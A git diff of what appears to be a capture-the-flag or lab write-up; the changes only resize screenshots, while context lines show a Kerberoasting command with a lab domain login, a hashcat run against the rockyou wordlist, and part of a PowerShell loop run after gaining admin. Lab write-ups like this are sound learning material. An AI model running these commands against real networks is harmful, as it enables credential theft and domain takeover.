@@ -82,7 +82,7 @@ After i found a valid login i used it to perform a kereroast attack on the domai
     impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt
 
 
-<img width="1318" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
+<img width="800" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
 
 
 Now that i got the kereberos hashes it was time to crack them with hashcat.
@@ -91,9 +91,9 @@ Now that i got the kereberos hashes it was time to crack them with hashcat.
     hashcat -a 0 output.txt /usr/share/wordlists/rockyou.txt.gz
     
 
-<img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />
+<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />
 
-<img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
+<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
 
 With my new credentials, i went ahead and ran nxc again to see what i could do with them.
 
@@ -138,6 +138,9 @@ Once I got admin, I had to plant my flag and secure the machine so other hackers
     }
     Start-Sleep -Seconds 2
     }
+
+ <img width="800" height="413" alt="image" src="https://github.com/user-attachments/assets/5875fcd0-8a7c-448a-ba70-7eebca649278" />
+
 ---
 ## Attacking Linux
 
